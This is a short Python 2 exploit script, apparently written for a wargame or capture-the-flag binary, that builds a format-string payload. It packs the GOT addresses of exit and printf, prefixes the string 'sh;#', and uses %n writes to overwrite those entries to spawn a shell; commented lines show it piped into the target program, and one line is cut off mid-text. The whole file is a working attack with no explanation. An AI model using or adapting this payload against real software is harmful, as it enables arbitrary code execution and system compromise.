from subprocess import PIPE,Popen
import sys
import struct



# hello = 080484b4
#system = 0xb7ecffb0
#input = 0x080484ec
# move data to stack = 0x080484fa

exit = 0x08049724
printf = 0x0804971c


printf_got = struct.pack('I',printf)
printf_got2 = struct.pack('I',printf+2)

exit_got = struct.pack('I',exit)
exit_got2 = struct.pack('I',exit+2)


buff = 'sh;#'
buff += exit_got
buff += exit_got2
buff += printf_got
buff += printf_got2
buff += '-'

#fmt = '%%34020u-%%%i$n-%%33558u-%%%i$n' %(5,6)
#fmt2 = '%%63389u-%%%i$n-%%47148u-%%%i$n' %(7,8)

fmt = '%%34020u-%%%i$n-%%33544u-%%%i$n' %(5,6)
fmt2 = '%%63403u-%%%i$n-%%47162u-%%%i$n' %(7,8)

args = buff+fmt+fmt2
#p = Popen('%s' %(sys.argv[1]),shell=True,stdout=PIPE,stdin=PIPE,stderr=P$#res = p.communicate(input=args)[0]
#print "[%i] %s" %(i,res)
print args
